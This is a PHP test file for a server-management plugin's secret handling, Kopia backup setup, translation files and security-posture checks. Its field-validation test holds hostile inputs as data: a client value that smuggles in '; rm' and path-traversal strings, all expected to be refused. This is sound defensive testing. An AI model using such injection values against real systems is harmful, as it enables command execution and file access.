        advisorSecretTake($id, $inbox);
    } catch (Problem) {
    }
    check('secret: a link is never read, only removed', !is_link("$inbox/$id.secret") && file_get_contents("$tmp/victim") === 'keep');
    chmod($inbox, 0755);
    try {
        advisorSecretTake($put($id, '{"password":"pw"}'), $inbox);
        check('secret refused: an inbox open to others', false);
    } catch (Problem $p) {
        same('secret refused: an inbox open to others', 'ad_secret_missing', $p->key);
    }
    chmod($inbox, 0700);
    touch("$inbox/" . $put(str_repeat('c', 32), '{}') . '.secret', time() - 600);
    same('secret: the sweep removes what nobody took', [1, []], [advisorInboxSweep($inbox, 120), glob("$inbox/*") ?: []]);
    same('secret: scrubbed out of what Kopia says', "ERROR invalid ••• for •••\n", advisorScrub("ERROR invalid pass\x01word-123 for AKIAXYZ\n", ['pass' => 'password-123', 'k' => 'AKIAXYZ']));

    // end to end: the web side's handover (in a process of its own, the secrets on its stdin) …
    $secrets = ['password' => 'Corr3ct-Horse-' . bin2hex(random_bytes(4)), 'access_key' => 'AKIATEST' . strtoupper(bin2hex(random_bytes(4))),
                'secret_key' => 'sk/' . bin2hex(random_bytes(12)) . '+x'];
    $web = "$tmp/web.php";
    file_put_contents($web, '<?php require ' . var_export(OFFICE_DIR . '/src/place.php', true) . '; require '
        . var_export(OFFICE_DIR . '/src/api.php', true) . '; echo apiSecretStash("advisor.kopia_repo", json_decode(stream_get_contents(STDIN), true));');
    $p = proc_open([PHP_BINARY, $web], [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes, null, ['OFFICE_INBOX_DIR' => $inbox, 'PATH' => getenv('PATH')]);
    fwrite($pipes[0], json_encode($secrets));
    fclose($pipes[0]);
    $ref = trim((string) stream_get_contents($pipes[1]));
    $webErr = (string) stream_get_contents($pipes[2]);
    proc_close($p);
    $st = @lstat("$inbox/$ref.secret");
    check('secret e2e: the web side left a 0600 file in the inbox', $st !== false && ($st['mode'] & 0777) === 0600, $webErr);
    $refused = proc_open([PHP_BINARY, $web], [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes2, null, ['OFFICE_INBOX_DIR' => $inbox]);
    fwrite($pipes2[0], json_encode(['password' => ['nested']]));
    fclose($pipes2[0]);
    check('secret e2e: the web side refuses odd shapes', str_contains((string) stream_get_contents($pipes2[1]), 'bad_request'));
    proc_close($refused);

    // … a stand-in for docker and Kopia: records hashes of what Kopia got, ps while it runs, writes its config as Kopia would
    $bin = "$tmp/bin";
    mkdir($bin);
    file_put_contents("$bin/docker", "#!/bin/sh\n# stand-in: docker exec [-i] <name> <cmd…> | docker restart …\n"
        . "case \"\$1\" in restart) exit 0;; exec) shift; [ \"\$1\" = -i ] && shift; shift; PATH=\"$bin:\$PATH\" exec \"\$@\";; esac\nexit 1\n");
    file_put_contents("$bin/kopia", "#!/bin/sh\n# stand-in for Kopia\n"
        . "[ \"\$1\" = --version ] && { echo '0.99.0 build: stand-in'; exit 0; }\n"
        . "[ \"\$1\" = maintenance ] && { printf '%s\\n' \"\$*\" >> '$tmp/maint.txt'; [ \"\$2\" = info ] && echo '{\"extendObjectLocks\":true}'; exit 0; }\n"
        . "[ \"\$1\" = repository ] && [ \"\$2\" = status ] && { if [ -e '$tmp/locked' ]; then echo '{\"blobRetention\":{\"retentionMode\":\"COMPLIANCE\",\"retentionPeriod\":2592000000000000}}'; "
        . "else echo '{\"blobRetention\":{}}'; fi; exit 0; }\n"
        . "ps -eo args > '$tmp/ps.txt'\n"
        . "printf '%s\\n' \"\$*\" > '$tmp/args.txt'\n"
        . "for v in \"\$KOPIA_PASSWORD\" \"\$AWS_ACCESS_KEY_ID\" \"\$AWS_SECRET_ACCESS_KEY\"; do printf '%s' \"\$v\" | sha256sum | cut -c1-64; done > '$tmp/got.txt'\n"
        . "if [ \"\$2\" = connect ]; then echo \"ERROR: invalid repository password \$KOPIA_PASSWORD\" >&2; exit 1; fi\n"
        . "printf '{\"storage\":{\"type\":\"s3\",\"config\":{\"bucket\":\"b1\",\"endpoint\":\"s3.example.test\",\"accessKeyID\":\"%s\",\"secretAccessKey\":\"%s\"}},\"hostname\":\"kopia\",\"username\":\"root\"}' "
        . "\"\$AWS_ACCESS_KEY_ID\" \"\$AWS_SECRET_ACCESS_KEY\" > '$tmp/config/repository.config'\n");
    chmod("$bin/docker", 0755);
    chmod("$bin/kopia", 0755);
    mkdir("$tmp/config");
    putenv("OFFICE_ADVISOR_DOCKER=$bin/docker");
    $target = ['name' => 'kopia-standin', 'image' => 'ghcr.io/imagegenius/kopia', 'webui' => 'http://192.0.2.10:51515',
               'info' => ['config' => "$tmp/config", 'sources' => ['host' => ADVISOR_SNAPSHOTS, 'target' => '/uso'], 'restore' => null, 'folders' => []]];
    $request = ['mode' => 'create', 'storage' => 's3', 'provider' => 'mega', 'endpoint' => 's3.example.test', 'bucket' => 'b1', 'prefix' => 'unraid/',
                'secret_ref' => $ref];
    $logBefore = (int) @filesize(AGENT_LOG);
    try {
        $answer = advisorKopiaRepo($request, $inbox, $target);
    } catch (Problem $p) {
        $answer = ['ok' => false, 'error' => $p->toArray()];
    }
    same('secret e2e: Kopia created and connected', true, $answer['ok'] ?? null);
    same('secret e2e: the RAM file is gone', [], glob("$inbox/*") ?: []);
    same('secret e2e: Kopia got the three secrets on its stdin', array_map(fn ($v) => hash('sha256', $v), array_values($secrets)),
        array_values(array_filter(explode("\n", (string) @file_get_contents("$tmp/got.txt")))));
    same('secret e2e: Kopia\'s arguments, no secret among them', 'repository create s3 --bucket=b1 --endpoint=s3.example.test --prefix=unraid/ --persist-credentials',
        trim((string) @file_get_contents("$tmp/args.txt")));
    same('secret e2e: the facts for the recovery sheet', ['b1', 's3.example.test', 'unraid/', 'root@kopia', '0.99.0', 'mega'],
        [$answer['facts']['bucket'] ?? null, $answer['facts']['endpoint'] ?? null, $answer['facts']['prefix'] ?? null, $answer['facts']['client'] ?? null,
         $answer['facts']['version'] ?? null, $answer['facts']['provider'] ?? null]);
    $ps = (string) @file_get_contents("$tmp/ps.txt");
    check('secret e2e: ps was looked at while Kopia ran', str_contains($ps, 'repository create s3'));
    same('secret e2e: the repository\'s format says it — no Object Lock', ['mode' => null], $answer['facts']['lock'] ?? 'not said');

    // … and the second time a connect that fails, Kopia repeating the password: cleaned out of the answer
    file_put_contents("$inbox/" . ($ref2 = str_repeat('d', 32)) . '.secret', json_encode($secrets));
    chmod("$inbox/$ref2.secret", 0600);
    try {
        advisorKopiaRepo(['mode' => 'connect', 'secret_ref' => $ref2] + $request, $inbox, $target);
        $fail = null;
    } catch (Problem $p) {
        $fail = $p;
    }
    same('secret e2e: a failing Kopia is a Problem', 'ad_kopia_failed', $fail?->key);
    $said = (string) ($fail?->params['output'] ?? '');
    check('secret e2e: its words without the password', str_contains($said, 'invalid repository password •••') && !str_contains($said, $secrets['password']));
    same('secret e2e: the RAM file is gone after a failure too', [], glob("$inbox/*") ?: []);

    // ransomware protection: asking the bucket about Object Lock (step probe) — the keys through RAM, signed here, nothing created …
    $requests = [];
    $bucketSays = ['status' => 200, 'headers' => [], 'error' => null,
                   'body' => '<?xml version="1.0"?><ObjectLockConfiguration><ObjectLockEnabled>Enabled</ObjectLockEnabled></ObjectLockConfiguration>'];
    $http = function (string $url, array $headers) use (&$requests, &$bucketSays): array {
        $requests[] = [$url, $headers];
        return $bucketSays;
    };
    $stash = function (string $ref, array $sec) use ($inbox): string {
        file_put_contents("$inbox/$ref.secret", json_encode($sec));
        chmod("$inbox/$ref.secret", 0600);
        return $ref;
    };
    @unlink("$tmp/args.txt");
    $probe = advisorKopiaRepo(['step' => 'probe', 'secret_ref' => $stash(str_repeat('e', 32), ['access_key' => $secrets['access_key'], 'secret_key' => $secrets['secret_key']])]
        + $request, $inbox, $target, $http);
    $auth = (string) ($requests[0][1]['Authorization'] ?? '');
    same('lock probe: the bucket keeps it — offered, 30 days (7 to 365); nothing created; the RAM file gone',
        ['enabled', [ADVISOR_LOCK_DAYS, ADVISOR_LOCK_MIN, ADVISOR_LOCK_MAX], false, []], [$probe['lock']['state'] ?? null, $probe['lock']['range'] ?? null, is_file("$tmp/args.txt"), glob("$inbox/*") ?: []]);
    same('lock probe: one signed GET ?object-lock to the endpoint typed (path style), only the access key ID in it', ['https://s3.example.test/b1?object-lock', 1, true],
        [$requests[0][0] ?? null, count($requests), str_starts_with($auth, 'AWS4-HMAC-SHA256 Credential=' . $secrets['access_key'] . '/')]);
    // … a new repository with it: asked again, created with COMPLIANCE for 30 days, the locks extended at maintenance …
    touch("$tmp/locked");
    $lockAnswer = advisorKopiaRepo(['lock_days' => '30', 'secret_ref' => $stash(str_repeat('f', 32), $secrets)] + $request, $inbox, $target, $http);
    same('lock create: Kopia\'s arguments — the retention, still no secret among them',
        'repository create s3 --bucket=b1 --endpoint=s3.example.test --prefix=unraid/ --retention-mode=COMPLIANCE --retention-period=30d --persist-credentials',
        trim((string) @file_get_contents("$tmp/args.txt")));
    same('lock create: the bucket asked again first, Kopia told to extend the locks, the facts say so (for the sheet)',
        [2, 'maintenance set --extend-object-locks=true', ['mode' => 'COMPLIANCE', 'days' => 30, 'extend' => true]],
        [count($requests), trim((string) @file_get_contents("$tmp/maint.txt")), $lockAnswer['facts']['lock'] ?? null]);
    $connectLock = advisorKopiaLock("$bin/docker", 'kopia-standin', null);
    unlink("$tmp/locked");
    same('lock connect: an existing repository\'s lock read from its format, whether Kopia extends it from its maintenance',
        [['mode' => 'COMPLIANCE', 'days' => 30, 'extend' => true], ['mode' => null]], [$connectLock, advisorKopiaLock("$bin/docker", 'kopia-standin', null)]);
    // … and a bucket that says no on the second look: nothing created
    $bucketSays = ['status' => 404, 'headers' => [], 'error' => null, 'body' => '<Error><Code>ObjectLockConfigurationNotFoundError</Code></Error>'];
    @unlink("$tmp/args.txt");
    try {
        advisorKopiaRepo(['lock_days' => 30, 'secret_ref' => $stash(str_repeat('0', 32), $secrets)] + $request, $inbox, $target, $http);
        $lockFail = null;
    } catch (Problem $p) {
        $lockFail = $p->key;
    }
    same('lock create: no Object Lock on the second look — refused before Kopia, the RAM file gone', ['ad_lock_off', false, []], [$lockFail, is_file("$tmp/args.txt"), glob("$inbox/*") ?: []]);
    $leaks = [];
    foreach ($requests as [$url, $headers]) {
        foreach (['secret_key', 'password'] as $k) {
            if (str_contains($url . json_encode($headers), $secrets[$k])) {
                $leaks[] = "$k in a request to the bucket";
            }
        }
    }
    $look = function (string $dir) use (&$look, &$leaks, $secrets, $tmp) {
        foreach (array_diff(scandir($dir) ?: [], ['.', '..']) as $n) {
            $path = "$dir/$n";
            if (is_link($path) || $path === "$tmp/config/repository.config") {   // Kopia's own config holds them, as when set up by hand
                continue;
            }
            if (is_dir($path)) {
                $look($path);
                continue;
            }
            $text = (string) @file_get_contents($path);
            foreach ($secrets as $k => $v) {
                if (str_contains($text, $v)) {
                    $leaks[] = "$k in $path";
                }
            }
        }
    };
    $look($tmp);
    $look(DATA_DIR);
    foreach ($secrets as $k => $v) {
        if (str_contains($ps, $v)) {
            $leaks[] = "$k in ps";
        }
        if (str_contains(json_encode([$answer, $fail?->params, $probe, $lockAnswer]), $v)) {
            $leaks[] = "$k in an answer";
        }
    }
    same('secret e2e: no secret in any file (data folder, log, state, the test\'s folders), in ps or an answer', [], $leaks);
    check('secret e2e: the log says what happened, nothing more', str_contains((string) @file_get_contents(AGENT_LOG, false, null, $logBefore), 'Kopia repository create (s3) in kopia-standin - exit 0'));
    $kept = (string) @file_get_contents("$tmp/config/repository.config");
    check('secret e2e: Kopia\'s own config keeps the connection (its job)', str_contains($kept, $secrets['access_key']));
    putenv('OFFICE_ADVISOR_DOCKER');

    // the request's fields: each checked
    $k = ['info' => ['folders' => [['host' => '/mnt/disks/usb/kopia', 'target' => '/local']]]];
    $base = ['mode' => 'create', 'storage' => 's3', 'endpoint' => 's3.example.test', 'bucket' => 'b1'];
    $good = ['password' => 'long-enough-pw', 'access_key' => 'AKIA1', 'secret_key' => 'secret-key-1'];
    foreach ([['endpoint', ['endpoint' => 'https://s3.example.test']], ['endpoint', ['endpoint' => "s3.exa\nmple.test"]], ['bucket', ['bucket' => 'b']],
              ['prefix', ['prefix' => '../x']], ['prefix', ['prefix' => '/abs']], ['mode', ['mode' => 'delete']], ['region', ['region' => 'eu central']],
              ['password', [], ['password' => 'short']], ['password', [], ['password' => "two\nlines-password"]], ['secret_key', [], ['secret_key' => 'with space key']],
              ['path', ['storage' => 'filesystem', 'path' => '/config/repo']], ['path', ['storage' => 'filesystem', 'path' => '/local/../etc']],
              ['client', ['mode' => 'connect', 'client' => 'root@kopia; rm']], ['lock_days', ['lock_days' => '6']], ['lock_days', ['lock_days' => '366']],
              ['lock_days', ['lock_days' => '30d']], ['lock_days', ['mode' => 'connect', 'lock_days' => 30]],
              ['lock_days', ['storage' => 'filesystem', 'path' => '/local/repo', 'lock_days' => 30]]] as $case) {
        [$want, $over, $sec] = $case + [2 => []];
        try {
            advisorKopiaSpec($over + $base, $sec + $good, $k);
            check("kopia field refused: $want " . json_encode($over + $sec), false);
        } catch (Problem $p) {
            same("kopia field refused: $want " . json_encode($over + $sec), $want, $p->params['field'] ?? null);
        }
    }
    $fs = advisorKopiaSpec(['storage' => 'filesystem', 'path' => '/local/repo/'] + $base, $good, $k);
    same('kopia field: a folder under a writable path', ['/local/repo', '/mnt/disks/usb/kopia/repo', ['create', 'filesystem', '--path=/local/repo', '--persist-credentials']],
        [$fs['path'], $fs['path_host'], $fs['args']]);
    same('kopia field: connect with another user@host', 'root@nostromo', advisorKopiaSpec(['mode' => 'connect', 'client' => 'root@nostromo'] + $base, $good, $k)['client']);
    $locked = advisorKopiaSpec(['lock_days' => '45'] + $base, $good, $k);
    same('kopia field: Object Lock for 45 days', [['mode' => 'COMPLIANCE', 'days' => 45], ['create', 's3', '--bucket=b1', '--endpoint=s3.example.test', '--retention-mode=COMPLIANCE', '--retention-period=45d', '--persist-credentials']],
        [$locked['lock'], $locked['args']]);
    hardeningRm($tmp);
}

// ===================================================================== strings

function langFile(string $file): array
{
    $j = json_decode((string) @file_get_contents($file), true);
    if (!is_array($j)) {
        check("valid JSON: $file", false);
        return [];
    }
    unset($j['_meta']);
    return $j;
}

/** The {name} placeholders of a text or of all forms of a plural, sorted */
function langPlaceholders(mixed $v): array
{
    $found = [];
    foreach (is_array($v) ? $v : [$v] as $s) {
        if (is_string($s) && preg_match_all('/\{(\w+)\}/', $s, $m)) {
            $found = array_merge($found, $m[1]);
        }
    }
    $found = array_values(array_unique($found));
    sort($found);
    return $found;
}

/** A plural: {"one": …, "other": …} with plural categories only (Intl.PluralRules), "other" always there */
function langPluralOk(mixed $v): bool
{
    if (!is_array($v) || !isset($v['other'])) {
        return false;
    }
    foreach ($v as $cat => $s) {
        if (!in_array($cat, ['zero', 'one', 'two', 'few', 'many', 'other'], true) || !is_string($s)) {
            return false;
        }
    }
    return true;
}

function testStrings(): void
{
    $pub = OFFICE_DIR . '/public';
    $sets = ['' => "$pub/lang"];
    foreach (glob("$pub/desks/*/lang") ?: [] as $dir) {
        $sets[basename(dirname($dir))] = $dir;
    }
    $complete = ['de', 'it', 'fr', 'es'];   // need every English key in every set; other languages may leave keys out (English fills in)
    $en = [];
    foreach ($sets as $desk => $dir) {
        $de = langFile("$dir/de.json");
        $e = langFile("$dir/en.json");
        $where = $desk === '' ? 'office' : $desk;
        same("$where: only in German", [], array_values(array_diff(array_keys($de), array_keys($e))));
        same("$where: only in English", [], array_values(array_diff(array_keys($e), array_keys($de))));
        foreach ($e as $k => $v) {
            $en[$desk === '' ? $k : "$desk.$k"] = true;
        }
        same("$where: English plurals well-formed", [], array_keys(array_filter($e, fn ($v) => is_array($v) && !langPluralOk($v))));

        // every other language: no keys English lacks, the same placeholders, plurals where English has them
        $codes = array_map(fn ($f) => basename($f, '.json'), glob("$dir/*.json") ?: []);
        foreach (array_diff(array_unique(array_merge($complete, $codes)), ['en']) as $code) {
            $l = $code === 'de' ? $de : langFile("$dir/$code.json");   // a missing file of a complete language fails here
            if ($code !== 'de') {   // German's keys are compared above
                same("$where/$code: keys English lacks", [], array_values(array_diff(array_keys($l), array_keys($e))));
                if (in_array($code, $complete, true)) {
                    same("$where/$code: English keys missing", [], array_values(array_diff(array_keys($e), array_keys($l))));
                }
            }
            $shape = $placeholders = [];
            foreach ($l as $k => $v) {
                if (!array_key_exists($k, $e)) {
                    continue;
                }
                if (is_array($e[$k]) ? !langPluralOk($v) : !is_string($v)) {
                    $shape[] = $k;
                }
                if (langPlaceholders($v) !== langPlaceholders($e[$k])) {
                    $placeholders[] = $k;
                }
            }
            same("$where/$code: plurals and texts shaped like English", [], $shape);
            same("$where/$code: placeholders like English", [], $placeholders);
        }
    }
    foreach (glob("$pub/lang/*.json") ?: [] as $file) {
        $meta = json_decode((string) @file_get_contents($file), true)['_meta'] ?? [];
        check(basename($file) . ': _meta has name and locale', is_string($meta['name'] ?? null) && $meta['name'] !== ''
            && is_string($meta['locale'] ?? null) && $meta['locale'] !== '');
    }

    // texts asked for by the pages: T('key') in a desk, t('key') / Office.t('key') anywhere
    foreach (glob("$pub/desks/*/desk.js") ?: [] as $file) {
        $desk = basename(dirname($file));
        $js = (string) file_get_contents($file);
        preg_match_all("/(?<![.\\w])T\\(\\s*'([a-z0-9_.]+)'\\s*[,)]/", $js, $m);
        foreach (array_unique($m[1]) as $k) {
            check("$desk/desk.js asks for $desk.$k", isset($en["$desk.$k"]));
        }
        preg_match_all("/\\bOffice\\.t\\(\\s*'([a-z0-9_.]+)'\\s*[,)]/i", $js, $m);
        foreach (array_unique($m[1]) as $k) {
            check("$desk/desk.js asks for $k", isset($en[$k]));
        }
    }
    $core = preg_replace(['#/\*.*?\*/#s', '#^\s*//.*$#m'], '', (string) file_get_contents("$pub/assets/core.js"));   // not in comments
    preg_match_all("/(?<![.\\w])t\\(\\s*'([a-z0-9_.]+)'\\s*[,)]/", $core, $m);
    foreach (array_unique($m[1]) as $k) {
        check("core.js asks for $k", isset($en[$k]));
    }

    // the caretaker shows every finding as <desk>.check.<id> (and _how, if any)
    $sources = [];
    foreach (glob(OFFICE_DIR . '/agent/desks/*.php') ?: [] as $file) {
        $sources[basename($file, '.php')][] = $file;
    }
    $sources['snapshot'][] = OFFICE_DIR . '/agent/lib/snapshotplans.php';
    foreach ($sources as $desk => $files) {
        foreach ($files as $file) {
            preg_match_all("/\\bfinding\\(\\s*'([a-z0-9_]+)'/", (string) file_get_contents($file), $m);
            foreach (array_unique($m[1]) as $id) {
                check("$desk: text for check '$id'", isset($en["$desk.check.$id"]));
            }
        }
    }

    // every Problem key has a text, at a desk or in the office
    $errors = [];
    foreach ($en as $k => $_) {
        if (preg_match('/(?:^|\.)errors\.([a-z0-9_]+)$/', $k, $x)) {
            $errors[$x[1]] = true;
        }
    }
    foreach (array_merge(glob(OFFICE_DIR . '/agent/*.php') ?: [], glob(OFFICE_DIR . '/agent/lib/*.php') ?: [], glob(OFFICE_DIR . '/agent/desks/*.php') ?: [],
                         glob(OFFICE_DIR . '/src/*.php') ?: []) as $file) {
        preg_match_all("/new (?:Problem|OfficeProblem)\\(\\s*'([a-z0-9_]+)'/", (string) file_get_contents($file), $m);
        foreach (array_unique($m[1]) as $key) {
            check(basename($file) . ": text for error '$key'", isset($errors[$key]));
        }
    }
}

/** Ms. Dustdevil squares pictures that aren't square (Unraid would squeeze them) */
function testIconSquare(): void
{
    if (!function_exists('imagecreatetruecolor')) {
        return;
    }
    $tmp = sys_get_temp_dir() . '/office-tests-square-' . getmypid();
    @mkdir($tmp, 0700, true);
    foreach (['wide' => [1123, 512], 'tall' => [100, 300], 'square' => [200, 200], 'small' => [60, 30]] as $n => [$w, $h]) {
        $im = imagecreatetruecolor($w, $h);
        imagepng($im, "$tmp/$n.png");
        $sq = clIconSquare("$tmp/$n.png");
        if ($n === 'square') {
            same('icon square: a square picture stays', null, $sq);
            continue;
        }
        $size = is_string($sq) ? getimagesizefromstring($sq) : null;
        $want = min(CL_SQUARE_SIDE, max($w, $h));
        same("icon square: $n becomes {$want}x{$want}", [$want, $want], $size ? [$size[0], $size[1]] : null);
    }
    same('icon square: not a picture', null, clIconSquare(__FILE__));
    array_map('unlink', glob("$tmp/*") ?: []);
    @rmdir($tmp);
}

/**
 * The night watchman's posture tips — how secure it stands now: shares open to everyone (a user share, a
 * disk; the flash only «secure» is not), Telnet, Unraid's FTP server (left to Fix Common Problems once it
 * has users), the CPU's protection off (with VMScape and VMs) or on, privileged containers. «I know, thanks»
 * kept on the server, back when what it is about changes, forgotten when it goes; the team lead's hint;
 * entries of a kind he no longer keeps (cron_dead) left out quietly; the data flow's link into Grafana — on
 * copies in a temporary folder.
 */
function testWatchmanPosture(): void
{
    $now = strtotime('2026-10-06 12:00:00');
    $tmp = sys_get_temp_dir() . '/office-tests-posture-' . getmypid();
    $src = "$tmp/src";
    $data = "$tmp/data";
    foreach (['plugins', 'vulns', 'extra', 'ssh'] as $d) {
        @mkdir("$src/$d", 0700, true);
    }
    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini", 'share_cfg' => "$src/share.cfg",
              'etc_passwd' => "$src/passwd", 'disks_ini' => "$src/disks.ini", 'ident' => "$src/ident.cfg", 'inetd' => "$src/inetd.conf",
              'ftp_users' => "$src/vsftpd.user_list", 'cmdline' => "$src/cmdline", 'cpuinfo' => "$src/cpuinfo", 'cpu_vulns' => "$src/vulns",
              'libvirt_sock' => "$src/libvirt-sock", 'virsh' => "$tmp/virsh"];
    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\n");
    file_put_contents($paths['syslog'], '');
    $sec = fn (string $more = '') => "[\"Media\"]\nexport=\"e\"\nsecurity=\"public\"\n[\"appdata\"]\nexport=\"e\"\nsecurity=\"private\"\n"
        . "[\"disk1\"]\nexport=\"eh\"\nsecurity=\"public\"\n[\"flash\"]\nexport=\"e\"\nsecurity=\"secure\"\n[\"Old\"]\nexport=\"-\"\nsecurity=\"public\"\n$more";
    file_put_contents($paths['sec'], $sec());
    file_put_contents($paths['sec_nfs'], "[\"Media\"]\nexport=\"e\"\nsecurity=\"public\"\n");
    file_put_contents($paths['share_cfg'], "shareSMBEnabled=\"yes\"\nshareNFSEnabled=\"yes\"\n");
    file_put_contents($paths['disks_ini'], "[\"disk1\"]\nname=\"disk1\"\n[\"flash\"]\nname=\"flash\"\n");
    file_put_contents($paths['ident'], "USE_TELNET=\"yes\"\nUSE_SSH=\"yes\"\n");
    file_put_contents($paths['inetd'], "# Unraid's inetd\nftp     stream  tcp     nowait  root    /usr/sbin/tcpd  vsftpd\n");
    file_put_contents($paths['cmdline'], "BOOT_IMAGE=/bzimage mitigations=off unraiduuid=1\n");
    file_put_contents($paths['cpuinfo'], "vendor_id\t: GenuineIntel\nmodel name\t: Intel(R) Core(TM) Ultra 7 265K\n");
    $vulns = fn (array $v) => array_map(fn ($f, $s) => file_put_contents("$src/vulns/$f", "$s\n"), array_keys($v), $v);
    $vulns(['vmscape' => 'Vulnerable', 'spectre_v2' => 'Vulnerable; IBPB: disabled', 'meltdown' => 'Not affected', 'retbleed' => 'Mitigation: Enhanced IBRS']);
    // libvirt: a stand-in virsh (`list --all --name`), failing while $src/virsh-fails is there
    file_put_contents($paths['libvirt_sock'], '');
    file_put_contents($paths['virsh'], "#!/bin/sh\n[ -e " . escapeshellarg("$src/virsh-fails") . " ] && exit 1\nprintf 'Win11\\n\\n'\n");
    chmod($paths['virsh'], 0755);
    $containers = ['vpn' => ['image' => 'wireguard', 'tokens' => ['--cap-add=NET_ADMIN', '--privileged']], 'web' => ['image' => 'nginx', 'tokens' => ['-p 80:80/tcp']]];
    $docker = function () use (&$containers) {
        return $containers;
    };
    $acks = "$tmp/acks.json";
    $round = fn (int $t) => watchmanRound($paths, $data, 1000, $now + $t, $docker, false, $acks);
    $tips = fn (int $t = 10) => array_column(watchmanPageState($data, $now + $t, false)['posture']['tips'] ?? [], null, 'id');

    // his first round: how it stands is told right away (nothing of it is "normal")
    same('posture: before his first round — nothing to show', null, watchmanPageState($data, $now, false)['posture']);
    $round(0);
    $t = $tips();
    same('posture: his tips, in the order of his page', ['flash', 'public', 'telnet', 'ftp', 'mitigations_off', 'vmscape', 'privileged'], array_keys($t));
    same('posture: shares open to everyone — a user share (SMB, NFS) and a disk; the flash (its own tip) and one not exported are not',
        [['names' => 'Media (SMB), Media (NFS), disk1 (SMB)', 'n' => 2], ['to' => 'share', 'name' => 'Media', 'path' => '/Shares/Share?name=Media'], 'advice'],
        [$t['public']['p'], $t['public']['link'], $t['public']['level']]);
    same('posture: the flash exported to guests for reading only is advice too (password hashes, SSH keys), with its page',
        [['proto' => 'SMB', 'level' => 'secure'], ['to' => 'flash', 'path' => '/Main/Boot?name=flash'], 'advice'],
        [$t['flash']['p'], $t['flash']['link'], $t['flash']['level']]);
    $flashTip = fn (array $shares) => array_column(watchmanPosture([], ['shares' => $shares]), null, 'id');
    $both = $flashTip(['flash' => ['smb' => 2, 'nfs' => 1], 'Photos' => ['smb' => 1, 'nfs' => 0]]);
    same('posture: the flash for writing over SMB and reading over NFS — one tip of its own, never among the public shares; a user share «Secure» has none',
        [['flash'], ['proto' => 'SMB, NFS', 'level' => 'public']], [array_keys($both), $both['flash']['p'] ?? null]);
    check('posture: the flash tip comes back when its access changes', ($both['flash']['sig'] ?? 1) !== ($flashTip(['flash' => ['smb' => 1, 'nfs' => 0]])['flash']['sig'] ?? 2));
    same('posture: the flash not exported — no tip', [], $flashTip(['flash' => ['smb' => 0, 'nfs' => 0]]));
    same('posture: links into Unraid — a disk\'s page, the boot device\'s for the flash',
        ['/Shares/Disk?name=disk1', '/Main/Boot?name=flash', '/Shares/Share?name=My%20Share'],
        [watchmanShareLink('disk1', ['disk1', 'flash']), watchmanShareLink('flash', []), watchmanShareLink('My Share', ['disk1'])]);
    same('posture: Telnet, FTP — where to switch them off', ['/Settings/ManagementAccess', '/Settings/FTP'], [$t['telnet']['link']['path'], $t['ftp']['link']['path']]);
    same('posture: the CPU — off, its open flaws (sorted), VMScape with a VM, where to switch it on',
        [['cpu' => 'Intel(R) Core(TM) Ultra 7 265K', 'open' => ['spectre_v2', 'vmscape']], ['n' => 1], '/Settings/BootParameters'],
        [$t['mitigations_off']['p'], $t['vmscape']['p'], $t['mitigations_off']['link']['path']]);
    same('posture: a privileged container — good to know', [['names' => 'vpn', 'n' => 1], 'info'], [$t['privileged']['p'], $t['privileged']['level']]);
    $page = watchmanPageState($data, $now + 10, false);
    same('posture: on the page — nobody knows them yet, six of his advice open', [6, [false]], [$page['posture']['open'], array_values(array_unique(array_column($page['posture']['tips'], 'known')))]);
    check('posture: no signatures on the page', !str_contains(json_encode($page['posture']), 'sig'));
    $hint = array_column(watchmanChecks($data), null, 'id');
    same('posture: the team lead hears it as good to know, next to "quiet"', [true, 'hint', null, 6, '#/watchman'],
        [isset($hint['quiet']), $hint['posture']['level'] ?? null, array_key_exists('ok', $hint['posture'] ?? []) ? $hint['posture']['ok'] : 'x',
         $hint['posture']['params']['n'] ?? null, $hint['posture']['link'] ?? null]);
    same('posture: never in the watch book', ['watch'], array_column(watchmanLoad($data)['book'], 'kind'));

    // «I know, thanks» — for every browser, on the server; the team lead hears one less
    watchmanPostureAck('telnet', true, $data, $now + 20, false);
    watchmanPostureAck('public', true, $data, $now + 21, false);
    $page = watchmanPageState($data, $now + 30, false);
    same('posture ack: known, counted no more', [true, true, false, 4], [$tips(30)['telnet']['known'], $tips(30)['public']['known'], $tips(30)['ftp']['known'], $page['posture']['open']]);
    same('posture ack: the team lead\'s hint follows', 4, array_column(watchmanChecks($data), null, 'id')['posture']['params']['n'] ?? null);
    $round(300);
    same('posture: the next round, the same — still known', [true, true], [$tips(310)['telnet']['known'], $tips(310)['public']['known']]);
    same('posture: VMs counted by libvirt (virsh list --all), never a look into libvirt.img', [1, null, 0],
        [watchmanVms($paths), watchmanVms(['libvirt_sock' => $paths['libvirt_sock'], 'virsh' => "$tmp/none"]), watchmanVms(['libvirt_sock' => "$tmp/none", 'virsh' => 'virsh'])]);
    touch("$src/virsh-fails");
    $round(400);
    same('posture: libvirt didn\'t answer — VMScape as the last round saw it', ['n' => 1], $tips(410)['vmscape']['p'] ?? null);
    unlink("$src/virsh-fails");
    unlink($paths['libvirt_sock']);
    $round(500);
    same('posture: the VM service off — no VM can run, no VMScape', false, isset($tips(510)['vmscape']));
    file_put_contents($paths['libvirt_sock'], '');

    // what it is about changes: back; gone: forgotten, and back as new when it returns
    file_put_contents($paths['sec'], $sec("[\"Photos\"]\nexport=\"e\"\nsecurity=\"public\"\n"));
    file_put_contents($paths['ident'], "USE_TELNET=\"no\"\n");
    $round(600);
    same('posture: another share opened — the tip is back; Telnet off — gone and forgotten',
        [false, 3, false, ['public']], [$tips(610)['public']['known'], $tips(610)['public']['p']['n'], isset($tips(610)['telnet']),
                                         array_keys((readJson("$data/posture.json") ?? [])['acks'] ?? [])]);
    file_put_contents($paths['ident'], "USE_TELNET=\"yes\"\n");
    $round(900);
    same('posture: Telnet on again — told again', false, $tips(910)['telnet']['known'] ?? null);
    watchmanPostureAck('telnet', true, $data, $now + 920, false);
    watchmanPostureAck('telnet', false, $data, $now + 930, false);
    same('posture: «Show again»', false, $tips(940)['telnet']['known']);
    // UPnP on (advice), Unraid Connect's remote access on (good to know) — both from the flash
    file_put_contents($paths['ident'], "USE_TELNET=\"yes\"\nUSE_UPNP=\"yes\"\n");
